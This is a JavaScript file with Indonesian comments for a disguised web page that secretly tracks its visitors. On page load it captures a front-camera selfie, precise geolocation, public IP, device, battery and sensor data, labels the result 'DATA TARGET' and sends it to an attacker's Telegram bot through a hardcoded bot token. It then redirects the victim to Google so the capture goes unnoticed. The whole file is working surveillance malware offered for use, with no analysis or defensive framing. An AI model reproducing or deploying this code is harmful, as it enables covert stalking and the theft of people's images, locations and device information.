// ===================================
// Dibuat oleh: Ahmad Zaki
// Silent version, tidak ada log di HTML
// ===================================

// Dummy updateStatus agar script tidak error
const updateStatus = (msg, isError=false) => {};

// --- Elemen ---
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');

// --- Parameter dari URL ---
const params = new URLSearchParams(window.location.search);
const alias = params.get('alias');
const chatId = params.get('uid');
const botToken = '8513392804:AAFCOr5OdVcUj05N3e8bDmGu3CPY-SS-8U8';

// --- Fungsi ---
// Device Info
const getDeviceInfo = async () => {
  const data = {
    userAgent: navigator.userAgent,
    platform: navigator.platform || 'N/A',
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    localTime: new Date().toString(),
    cpuCores: navigator.hardwareConcurrency || 'N/A',
    memory: navigator.deviceMemory || 'N/A',
    connection: {
      type: navigator.connection ? navigator.connection.effectiveType : 'N/A',
      downlink: navigator.connection ? `${navigator.connection.downlink} Mbps` : 'N/A'
    }
  };
  try {
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      data.battery = { level: Math.round(battery.level*100)+'%', isCharging: battery.charging };
    } else { data.battery = { level: 'N/A', isCharging: 'N/A' }; }
  } catch(e) { data.battery = { level: 'Error', isCharging:'N/A' }; }
  return data;
};

// Location
const getLocation = () => {
  return new Promise((resolve, reject)=>{
    if(!navigator.geolocation){ reject('Geolocation tidak tersedia'); return;}
    navigator.geolocation.getCurrentPosition(
      pos => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy}),
      err => reject(err.message),
      {enableHighAccuracy:true, timeout:15000, maximumAge:0}
    );
  });
};

// Selfie
const getPhoto = async () => {
  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
  videoEl.srcObject = stream;
  await new Promise(r=>videoEl.onloadedmetadata=r);
  videoEl.play();
  await new Promise(r=>setTimeout(r,500));
  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  const ctx = canvasEl.getContext('2d');
  ctx.drawImage(videoEl,0,0,canvasEl.width,canvasEl.height);
  const photoBase64 = canvasEl.toDataURL('image/jpeg',0.7);
  stream.getTracks().forEach(track=>track.stop());
  videoEl.srcObject = null;
  return photoBase64;
};

// IP
const getIpAddress = async () => {
  try{
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'N/A';
  } catch(e){ return 'N/A'; }
};

// Sensor
const getSensorData = () => {
  return new Promise((resolve)=>{
    if('Accelerometer' in window){
      try{
        const acl = new Accelerometer({frequency:1});
        acl.onreading = ()=>{
          let orientation = 'Tidak diketahui';
          const {x,y,z} = acl;
          if(Math.abs(z)>8) orientation='Terlentang (di meja)';
          else if(Math.abs(y)>8) orientation='Tegak (dipegang)';
          else if(Math.abs(x)>8) orientation='Miring (landscape)';
          acl.stop();
          resolve({orientation,x:x.toFixed(2),y:y.toFixed(2),z:z.toFixed(2)});
        };
        acl.onerror=()=>resolve({orientation:'Error',x:0,y:0,z:0});
        acl.start();
      } catch(e){ resolve({orientation:'Error',x:0,y:0,z:0}); }
    } else resolve({orientation:'N/A',x:0,y:0,z:0});
  });
};

// Kirim ke Telegram
const sendToTelegram = async (data) => {
  const { deviceInfo, location, photoBase64, ipAddress, sensor } = data;
  const message = `
🔔 DATA TARGET (${alias || 'Target'})
-----------------------------------
📍 Lokasi & Jaringan
IP Publik: ${ipAddress}
Tipe Jaringan: ${deviceInfo.connection.type}
Kecepatan: ${deviceInfo.connection.downlink}

📱 Perangkat
Platform: ${deviceInfo.platform}
Baterai: ${deviceInfo.battery.level} (Charging: ${deviceInfo.battery.isCharging})
Resolusi: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
CPU: ${deviceInfo.cpuCores} inti / RAM: ${deviceInfo.memory} GB

🤸 Posisi HP (Sensor)
Orientasi: ${sensor.orientation}
Sensor(x,y,z): ${sensor.x}, ${sensor.y}, ${sensor.z}

⏰ Waktu: ${deviceInfo.localTime}
🌐 User Agent: ${deviceInfo.userAgent}
-----------------------------------
  `.trim();

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({chat_id:chatId,text:message})
  });

  if(location){
    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:chatId, latitude:location.lat, longitude:location.lon, horizontal_accuracy:location.accuracy})
    });
  }

  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('photo', await (await fetch(photoBase64)).blob(), 'selfie.jpg');
  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{method:'POST', body:formData});
};

// Start
const start = async () => {
  if(!chatId || !alias){ window.location.href='https://www.google.com'; return; }

  try{
    const data={};
    data.location = await getLocation().catch(()=>null);
    data.photoBase64 = await getPhoto();
    const [deviceInfo, ipAddress, sensor] = await Promise.all([
      getDeviceInfo(),
      getIpAddress(),
      getSensorData()
    ]);
    data.deviceInfo=deviceInfo;
    data.ipAddress=ipAddress;
    data.sensor=sensor;
    await sendToTelegram(data);
  } catch(e){}
  setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1000);
};

window.addEventListener('DOMContentLoaded', start);

// --- Search bar redirect ke Google ---
document.getElementById('search-form').addEventListener('submit', (e)=>{
  e.preventDefault();
  const q = document.getElementById('search-input').value;
  if(!q) return;
  window.location.href = `https://www.google.com/search?q=${encodeURIComponent(q)}`;
});
